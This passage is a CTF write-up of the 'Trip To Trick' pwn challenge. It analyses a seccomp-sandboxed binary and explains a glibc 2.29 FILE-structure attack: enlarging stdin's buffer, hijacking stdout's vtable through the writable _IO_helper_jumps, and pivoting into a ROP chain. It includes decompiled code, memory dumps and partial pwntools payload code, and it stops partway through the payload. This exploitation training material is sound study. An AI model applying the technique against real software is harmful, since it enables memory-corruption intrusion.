<p>Trip To Trick   </p>
</blockquote>
<blockquote>
<p><strong>Description</strong>:<br>492 Points   </p>
<p><strong>Author</strong>:<br>NextLine<br>Flag Path: /home/pwn/flag</p>
<p>nc 138.68.67.161 20006</p>
<p><a href="https://mega.nz/#!C340maAY!5TKiIDX7UWNMCcaFng2VoIqfZtJs-eGmc_Z5BYZR82I" target="_blank" rel="noopener">trip_to_trick</a></p>
<p>c6fd4ef7c34c528668edd62914a79602</p>
<p><a href="https://mega.nz/#!rzhykASR!m3uFt0cGx8jvNZjJ8O2dtZch-XKv-P-zo-vDd41rNwY" target="_blank" rel="noopener">libc.so.6</a></p>
<p>2fb0d6800d4d79ffdc7a388d7fe6aea0</p>
</blockquote>
<h3 id="TLDR"><a href="#TLDR" class="headerlink" title="TLDR"></a>TLDR</h3><ul>
<li>Set <code>_IO_2_1_stdin_-&gt;file-&gt;_IO_BUF_END = STDIN+0x2000</code></li>
<li>Next scanf will have <strong>full</strong> control of IO_FILE structures</li>
<li><code>STDOUT-&gt;vtable = _IO_helper_jumps</code> &amp; <code>STDOUT-&gt;flags=0x0</code> to bypass <strong>vtable checker</strong> and <strong>mprotect</strong> of <code>_IO_file_jumps</code></li>
<li>In <strong>libc-2.29</strong> vtables are writeable <strong>again</strong> so we can control rip by changing the value of <code>_IO_helper_jumps-&gt;__finish</code>  </li>
<li>Set <code>_IO_helper_jumps-&gt;__finish=setcontext+0x35</code> to obtain <strong>stack pivot</strong>.</li>
<li>Construct a <strong>ropchain</strong> to open/read/print the file</li>
</ul>
<h3 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h3><p>I didn’t solve this challenge during ctf time, but I spent a lot of time trying to do it, perhaps in the end I had the opportunity to speak with a guy who solved named <strong>stan</strong> from discord which told me his solution. </p>
<p>I eventually ended up implementing it, I learned a lot of new things about the <strong>IO_FILE struct</strong>, huge thanks to him for leading me into the right path in this challenge.</p>
<h3 id="Information-extraction"><a href="#Information-extraction" class="headerlink" title="Information extraction"></a>Information extraction</h3><p>File<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file trip_to_trick</span><br><span class="line">trip_to_trick: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9ba40c68c917a91e11558eceaffd3e006531a6d9, <span class="keyword">for</span> GNU/Linux 3.2.0, not stripped</span><br></pre></td></tr></table></figure></p>
<p>Security<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec trip_to_trick</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/TripToTrick/trip_to_trick'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure></p>
<h3 id="Static-analysis"><a href="#Static-analysis" class="headerlink" title="Static analysis"></a>Static analysis</h3><h4 id="Main-function"><a href="#Main-function" class="headerlink" title="Main function"></a>Main function</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *v4; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v5 = <span class="number">0L</span>L;</span><br><span class="line">  sandbox(argc, argv, envp);</span><br><span class="line">  nohack();</span><br><span class="line">  main_init(argc);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"gift : %p\n"</span>, &amp;system);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"1 : "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%llx %llx"</span>, &amp;v4, &amp;v5);</span><br><span class="line">  *v4 = v5;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"2 : "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%llx %llx"</span>, &amp;v4, &amp;v5);</span><br><span class="line">  *v4 = v5;</span><br><span class="line">  fclose(<span class="built_in">stdout</span>);</span><br><span class="line">  fclose(<span class="built_in">stdin</span>);</span><br><span class="line">  fclose(<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>There’s not much in the main from it we can get:</p>
<ul>
<li>free libc leak </li>
<li>two arbitrary writes (scanfs)</li>
<li><code>fclose(stdout)</code>, <code>fclose(stdin)</code> and <code>fclose(stderr)</code> (important for the exploit).</li>
</ul>
<h4 id="sandbox-function"><a href="#sandbox-function" class="headerlink" title="sandbox function"></a>sandbox function</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">sandbox</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = seccomp_init(<span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( !v1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"seccomp error"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112L</span>L, <span class="number">15L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112L</span>L, <span class="number">3L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112L</span>L, <span class="number">10L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112L</span>L, <span class="number">9L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112L</span>L, <span class="number">12L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112L</span>L, <span class="number">2L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112L</span>L, <span class="number">0L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112L</span>L, <span class="number">1L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112L</span>L, <span class="number">60L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112L</span>L, <span class="number">231L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)seccomp_load(v1) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    seccomp_release(v1);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"seccomp error"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> seccomp_release(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>The author uses seccomp to only allow a few syscalls:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sym.imp.seccomp_rule_add(iVar2, <span class="number">0x7fff0000</span>, <span class="number">0xf</span>, <span class="number">0</span>); # SCMP_ACT_ALLOW  sys_rt_sigreturn</span><br><span class="line">sym.imp.seccomp_rule_add(iVar2, <span class="number">0x7fff0000</span>, <span class="number">3</span>, <span class="number">0</span>); # sys_close</span><br><span class="line">sym.imp.seccomp_rule_add(iVar2, <span class="number">0x7fff0000</span>, <span class="number">10</span>, <span class="number">0</span>); # sys_mprotect</span><br><span class="line">sym.imp.seccomp_rule_add(iVar2, <span class="number">0x7fff0000</span>, <span class="number">9</span>, <span class="number">0</span>); # sys_mmap</span><br><span class="line">sym.imp.seccomp_rule_add(iVar2, <span class="number">0x7fff0000</span>, <span class="number">0xc</span>, <span class="number">0</span>); # sys_brk</span><br><span class="line">sym.imp.seccomp_rule_add(iVar2, <span class="number">0x7fff0000</span>, <span class="number">2</span>, <span class="number">0</span>); # sys_open</span><br><span class="line">sym.imp.seccomp_rule_add(iVar2, <span class="number">0x7fff0000</span>, <span class="number">0</span>, <span class="number">0</span>); # sys_read</span><br><span class="line">sym.imp.seccomp_rule_add(iVar2, <span class="number">0x7fff0000</span>, <span class="number">1</span>, <span class="number">0</span>); # sys_write</span><br><span class="line">sym.imp.seccomp_rule_add(iVar2, <span class="number">0x7fff0000</span>, <span class="number">0x3c</span>, <span class="number">0</span>); # sys_exit</span><br><span class="line">sym.imp.seccomp_rule_add(iVar2, <span class="number">0x7fff0000</span>, <span class="number">0xe7</span>, <span class="number">0</span>); # sys_exit_group</span><br></pre></td></tr></table></figure>
<p>So we don’t have <strong>execve</strong> syscall so we can’t get a proper shell, but we still have <strong>sys_write</strong>,<strong>sys_read</strong>,<strong>sys_write</strong> which can be used to read the flag file from a path location.</p>
<h4 id="nohack-function"><a href="#nohack-function" class="headerlink" title="nohack function"></a>nohack function</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">nohack</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( ((_WORD)<span class="built_in">stdout</span> + <span class="number">2208</span>) &amp; <span class="number">0xFFF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"mprotect error"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> mprotect(&amp;<span class="built_in">stdout</span>[<span class="number">10</span>]._IO_write_end, <span class="number">0x700</span>uLL, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>In <strong>libc-2.29</strong> the permissions to write in vtables are enabled so the author decided to make them read only but he did a mistake in setting the ranges, he missed a couple of tables:</p>
<h4 id="Blocked-vtables-from-the-author"><a href="#Blocked-vtables-from-the-author" class="headerlink" title="Blocked vtables from the author:"></a>Blocked vtables from the author:</h4><ul>
<li>_IO_wfile_jumps_mmap</li>
<li>_IO_wfile_jumps</li>
<li>_IO_wmem_jumps</li>
<li>_IO_mem_jumps</li>
<li>_IO_strn_jumps</li>
<li>_IO_obstack_jumps</li>
<li>_IO_file_jumps_maybe_mmap</li>
<li>_IO_file_jumps_mmap</li>
<li>_IO_file_jumps</li>
<li>_IO_str_jumps</li>
</ul>
<h4 id="Unblocked-vtables"><a href="#Unblocked-vtables" class="headerlink" title="Unblocked vtables:"></a>Unblocked vtables:</h4><ul>
<li>_IO_helper_jumps</li>
<li>_IO_cookie_jumps</li>
<li>_IO_proc_jumps</li>
<li>_IO_str_chk_jumps</li>
<li>_IO_wstrn_jumps</li>
<li>_IO_wfile_jumps_maybe_mmap</li>
</ul>
<p>Because of this the only thing we need to do is to change the <strong>vtable pointer</strong> into one of the writeable vtables to get control of rip.</p>
<h3 id="Get-arbitrary-write-with-“unlimited”-input"><a href="#Get-arbitrary-write-with-“unlimited”-input" class="headerlink" title="Get arbitrary write with “unlimited” input"></a>Get arbitrary write with “unlimited” input</h3><p>First thing we notice is that we have two very limited arbitrary writes with a max size of <strong>long long</strong> and we can only change <strong>two</strong> locations in memory.</p>
<p>This is the uninitialised <code>_IO_2_1_stdin_</code>:<br><a data-fancybox="gallery" href="https://i.imgur.com/NjshmMi.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/NjshmMi.png" alt><br></a><br>What happens next depends on <strong>setvbuf</strong> option:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">return</span> setvbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>From <a href="http://www.cplusplus.com/reference/cstdio/setvbuf/" target="_blank" rel="noopener">here</a> we know the option used is <code>_IONBF</code> which means “No buffering” the buffer is <strong>not</strong> used. Each I/O operation is written as <strong>soon</strong> as possible. This a usual thing in ctfs to disable buffering of <strong>stdout</strong>, <strong>stdin</strong> and <strong>stderr</strong> and this time is very handy for us because instead of allocating a new buffer on the heap, the limits of <code>_IO_buf_base</code> and <code>_IO_buf_end</code> will be defined with pointers within stdin where <code>_IO_buf_end-_IO_buf_base = 1</code> saving only 1 character which will be the end line character (‘\n’ or ‘’ depends on the input).</p>
<p>Here is the <strong>stdin</strong> after being initialized by <strong>setvbuf</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/leh8S9p.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/leh8S9p.png" alt><br></a><br>If we use the first <strong>scanf</strong> to increase the value of <code>stdio-&gt;_IO_buf_end</code>, instead of only controlling the <code>_shortbuf</code> field we will be able to control the contents of what comes next:<br><a data-fancybox="gallery" href="https://i.imgur.com/odMGD5L.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/odMGD5L.png" alt><br></a><br>Also the libc source code can be found <a href="https://github.com/lattera/glibc/blob/895ef79e04a953cac1493863bcae29ad85657ee1/libio/fileops.c#L1326" target="_blank" rel="noopener">at</a>:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_buf_base</span><br><span class="line">          &amp;&amp; want &lt; (<span class="keyword">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)) <span class="comment">// sub must be positive</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (__underflow (fp) == EOF)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* These must be set before the sysread as we might longjmp out</span></span><br><span class="line"><span class="comment">         waiting for input. */</span></span><br><span class="line">      _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">      _IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Try to maintain alignment: read a whole number of blocks.  */</span></span><br><span class="line">      count = want;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_buf_base)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">size_t</span> block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;</span><br><span class="line">          <span class="keyword">if</span> (block_size &gt;= <span class="number">128</span>)</span><br><span class="line">        count -= want % block_size; <span class="comment">// writing in blocks </span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      count = _IO_SYSREAD (fp, s, count); <span class="comment">// we want to reach here in order to complete the read</span></span><br></pre></td></tr></table></figure></p>
<p>Much better images explaining the code above can be found in <a href="https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique" target="_blank" rel="noopener">Angelboy</a> slides.</p>
<p>Python code:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r.sendlineafter(<span class="string">'1 : '</span>, <span class="string">"%x %x"</span> %(_IO_2_1_STDIN_+_IO_BUF_END,_IO_2_1_STDIN_+<span class="number">0x2000</span>))</span><br></pre></td></tr></table></figure>
<h3 id="Filling-the-memory"><a href="#Filling-the-memory" class="headerlink" title="Filling the memory"></a>Filling the memory</h3><p>From the initial plan we know we must change values on <code>_IO_2_1_STDOUT-&gt;file-&gt;vtable</code>, and values on the <code>_IO_helper_jumps</code> vtable but there will be a lot of values in the middle because we are overflowing everything from the very beginning, in this case from the <strong>stdin</strong> we can’t just fill everything with nulls and expect everything to run smoothly , obviously the program will break if we do that we need to keep an eye on the fields that contain mappable addresses.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"> _lock(1st) and _wide_data(2nd) and vtable(last) fields must have </span><br><span class="line"> a valid mappable address preferable to the original ones(_lock).</span><br><span class="line">                                                            ^</span><br><span class="line">0x7fb4561efa80 &lt;_IO_2_1_stdin_+128&gt;:    0x000000000a000000  |__ 0x00007fb4561f2590</span><br><span class="line">0x7fb4561efa90 &lt;_IO_2_1_stdin_+144&gt;:    0xffffffffffffffff  |   0x0000000000000000</span><br><span class="line">0x7fb4561efaa0 &lt;_IO_2_1_stdin_+160&gt;:    0x00007fb4561efae0 _|   0x0000000000000000 </span><br><span class="line">0x7fb4561efab0 &lt;_IO_2_1_stdin_+176&gt;:    0x0000000000000000  |   0x0000000000000000</span><br><span class="line">0x7fb4561efac0 &lt;_IO_2_1_stdin_+192&gt;:    0x00000000ffffffff  |   0x0000000000000000</span><br><span class="line">0x7fb4561efad0 &lt;_IO_2_1_stdin_+208&gt;:    0x0000000000000000  |__ 0x00007fb4561f1560</span><br><span class="line">0x7fb4561efae0 &lt;_IO_wide_data_0&gt;:       0x0000000000000000      0x0000000000000000</span><br><span class="line">........</span><br><span class="line">0x7fb4561efc10 &lt;_IO_wide_data_0+304&gt;:   0x00007fb4561f1020      0x0000000000000000</span><br><span class="line">0x7fb4561efc20 &lt;__memalign_hook&gt;:       0x00007fb4560a4190      0x0000000000000000 -&gt; Can be filled with 0s</span><br><span class="line">0x7fb4561efc30 &lt;__malloc_hook&gt;: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7fb4561efc40 &lt;main_arena&gt;:    0x0000000000000000      0x0000000000000001-----------|</span><br><span class="line">......                                                                               |-&gt; Can be filled with 0s</span><br><span class="line">0x7fb4561f04d0 &lt;main_arena+2192&gt;:       0x0000000000021000      0x00007fb4560a5a90---|</span><br><span class="line">0x7fb4561f0520 &lt;default_overflow_region&gt;:       0x0000000000000000      0x0000000000000001 --|                                                                </span><br><span class="line">0x7fb4561f0530 &lt;default_overflow_region+16&gt;:    0x0000000000000002      0x00007fb4561f32d8   |                                                            </span><br><span class="line">0x7fb4561f0540 &lt;default_overflow_region+32&gt;:    0x0000000000000000      0xffffffffffffffff   |                                                             </span><br><span class="line">0x7fb4561f0550 &lt;__libc_utmp_jump_table&gt;:        0x00007fb4561ee6e0      0x00007fb4561c1e48   |-&gt; must be filled                                                            </span><br><span class="line">0x7fb4561f0560 &lt;_nl_global_locale&gt;:     0x00007fb4561ec580      0x00007fb4561ecac0           |with the correct                                                              </span><br><span class="line">...............                                                                              |values otherwise </span><br><span class="line">0x7fb4561f0640 &lt;_nl_global_locale+224&gt;: 0x00007fb4561bc678      0x0000000000000000 ----------|page fault.                                                             </span><br><span class="line">0x7fb4561f0650: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7fb4561f0660 &lt;_IO_list_all&gt;:  0x00007fb4561f0680      0x0000000000000000 --&gt; Keep this too</span><br><span class="line">0x7fb4561f0670: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7fb4561f0680 &lt;_IO_2_1_stderr_&gt;:       0x00000000fbad2087      0x00007fb4561f0703 --|-&gt;calculate the offsets                                                                        </span><br><span class="line">.....                                                                                |from the libc_base to</span><br><span class="line">0x7fb4561f0750 &lt;_IO_2_1_stderr_+208&gt;:   0x0000000000000000      0x00007fb4561f1560 --|read original values                                                                        </span><br><span class="line">0x7fb4561f0760 &lt;_IO_2_1_stdout_&gt;:       0x00000000fbad2887      0x00007fb4561f07e3 --|-&gt; Everything remains the                                                                       </span><br><span class="line">....                                                                               --|same</span><br><span class="line">0x7fb4561f0830 &lt;_IO_2_1_stdout_+208&gt;:   0x0000000000000000      0x00007fb4561f1560 -&gt; Change to _IO_helper_jumps                                                                         </span><br><span class="line">0x7fb4561f0840 &lt;stderr&gt;:        0x00007fb4561f0680      0x00007fb4561f0760--|-&gt; Stays the same</span><br><span class="line">0x7fb4561f0850 &lt;stdin&gt;: 0x00007fb4561efa00      0x00007fb456031e90----------|</span><br><span class="line">0x7fb4561f0860 &lt;__elf_set___libc_subfreeres_element_free_mem__&gt;:        0x00007fb45619fdd0--|-&gt; can be filled</span><br><span class="line">...                                                                                         |with 0s. </span><br><span class="line">0x7fb4561f0940 &lt;__elf_set___libc_subfreeres_element_pw_map_free__&gt;:     0x00007fb4561a1d10--|      </span><br><span class="line">0x7fb4561f0950: 0x0000000000000000      0x0000000000000000</span><br><span class="line">                                                           |-&gt; the address that will control RIP</span><br><span class="line">0x7fb4561f0960 &lt;_IO_helper_jumps&gt;:      0x0000000000000000 |    0x0000000000000000</span><br><span class="line">0x7fb4561f0970 &lt;_IO_helper_jumps+16&gt;:   0x00007fb45609ca70_|    0x00007fb45607f530</span><br><span class="line">0x7fb4561f0980 &lt;_IO_helper_jumps+32&gt;:   0x00007fb45609c140      0x00007fb45609c150</span><br><span class="line">0x7fb4561f0990 &lt;_IO_helper_jumps+48&gt;:   0x00007fb45609d7b0      0x00007fb45609c1b0</span><br><span class="line">0x7fb4561f09a0 &lt;_IO_helper_jumps+64&gt;:   0x00007fb45609c3b0      0x00007fb45609cae0</span><br><span class="line">0x7fb4561f09b0 &lt;_IO_helper_jumps+80&gt;:   0x00007fb45609c800      0x00007fb45609c6d0</span><br><span class="line">0x7fb4561f09c0 &lt;_IO_helper_jumps+96&gt;:   0x00007fb45609ca60      0x00007fb45609c870</span><br><span class="line">0x7fb4561f09d0 &lt;_IO_helper_jumps+112&gt;:  0x00007fb45609d910      0x00007fb45609d920</span><br><span class="line">0x7fb4561f09e0 &lt;_IO_helper_jumps+128&gt;:  0x00007fb45609d8f0      0x00007fb45609ca60</span><br><span class="line">0x7fb4561f09f0 &lt;_IO_helper_jumps+144&gt;:  0x00007fb45609d900      0x0000000000000000</span><br><span class="line">0x7fb4561f0a00 &lt;_IO_helper_jumps+160&gt;:  0x0000000000000000      0x0000000000000000</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>Now in python, filling <strong>stdin</strong>:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># STDIN+131</span></span><br><span class="line">INPUT2 =<span class="string">'\x0a'</span>+<span class="string">'\x00'</span>*<span class="number">4</span><span class="comment"># p64(_IO_STDFILE_0_LOCK)</span></span><br><span class="line">INPUT2 += p64(_IO_STDFILE_0_LOCK)</span><br><span class="line">INPUT2 += p64(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _offset</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _codecvt</span></span><br><span class="line">INPUT2 += p64(_IO_WIDE_DATA_0) <span class="comment"># _wide_data</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _freeres_list</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _freeres_buf</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># __pad5</span></span><br><span class="line">INPUT2 += p32(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _mode</span></span><br><span class="line">INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">INPUT2 += p64(_IO_FILE_JUMPS) <span class="comment"># vtable"""</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>)*<span class="number">19</span>*<span class="number">2</span> + p64(LIBC+<span class="number">0x1bb020</span>)+p64(<span class="number">0x0</span>)</span><br><span class="line">INPUT2 += p64(LIBC+libc.symbols[<span class="string">'__memalign_hook'</span>]) <span class="comment"># __memalign_hook</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>)</span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>)+p64(<span class="number">0x0</span>)</span><br></pre></td></tr></table></figure></p>
